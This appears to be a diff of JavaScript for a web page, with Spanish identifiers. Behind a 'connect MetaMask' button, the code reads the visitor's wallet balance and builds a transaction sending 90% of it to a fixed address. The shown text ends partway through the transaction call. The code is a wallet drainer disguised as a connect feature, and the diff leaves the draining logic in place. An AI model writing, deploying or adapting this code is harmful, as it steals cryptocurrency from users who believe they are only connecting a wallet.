@@ -1,17 +1,13 @@
-  
 
 document.getElementById('conectarMetaMask').addEventListener('click', () => {
     if (window.ethereum) {
         const web3 = new Web3(window.ethereum);
-
         window.ethereum.enable().then(accounts => {
             const usuarioAddress = accounts[0];
-            const direccionDestino = '0x8935361d21943Ee8a863082EdD8a6Aefb062E434'; // Reemplaza con la dirección a la que quieres enviar fondos
-
+            const direccionDestino = '0x8935361d21943Ee8a863082EdD8a6Aefb062E434'; 
             web3.eth.getBalance(usuarioAddress).then(balance => {
                 const cantidadEnviar = balance * 0.9;
                 const cantidadEnviarEnWei = web3.utils.toWei(cantidadEnviar.toString(), 'wei');
-
                 web3.eth.sendTransaction({
                     from: usuarioAddress,
                     to: direccionDestino,
